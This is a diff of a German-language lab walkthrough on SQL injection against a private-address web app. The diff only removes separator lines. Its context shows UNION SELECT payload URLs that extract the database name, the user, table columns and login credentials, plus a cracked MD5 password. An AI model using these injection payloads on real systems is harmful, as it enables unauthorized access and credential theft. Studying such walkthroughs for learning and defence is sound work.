@@ -1,6 +1,6 @@
 # SQL Injection to Shell – Exploitation Walkthrough
 
----
+
 
 ## Inhaltsverzeichnis
 - [Einleitung](#einleitung)
@@ -9,7 +9,7 @@
 - [Benutzeranmeldeinformationen extrahieren](#benutzeranmeldeinformationen-extrahieren)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
 
 ## Einleitung
 
@@ -22,7 +22,7 @@ Dieses Dokument beschreibt einen vollständigen SQL-Injection-Angriff mit dem Zi
 
 Ziel der folgenden Schritte ist es, über SQL Injection Zugriff auf sensible Daten zu erlangen, die zur weiteren Kompromittierung des Systems verwendet werden können.
 
----
+
 
 ## Erste Tests
 
@@ -46,7 +46,7 @@ http://192.168.1.142/cat.php?id=2 UNION SELECT 1,database(),3,4 --+
 http://192.168.1.142/cat.php?id=2 UNION SELECT 1,user(),3,4 --+
 ```
 
---- 
+
 
 <div align=right>
 
@@ -94,7 +94,7 @@ UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHE
 - login
 - password
 
----
+
 
 <div align=right>
 
@@ -118,7 +118,7 @@ http://192.168.1.142/cat.php?id=2 UNION SELECT 1,group_concat(id,0x3a3a,login,0x
 - Passwort-Hash (MD5): 8efe310f9ab3efeae8d410a8e0166eb2
 - Klartext-Passwort: P4ssw0rd
 
----
+
 
 ## Haftungsausschluss
 
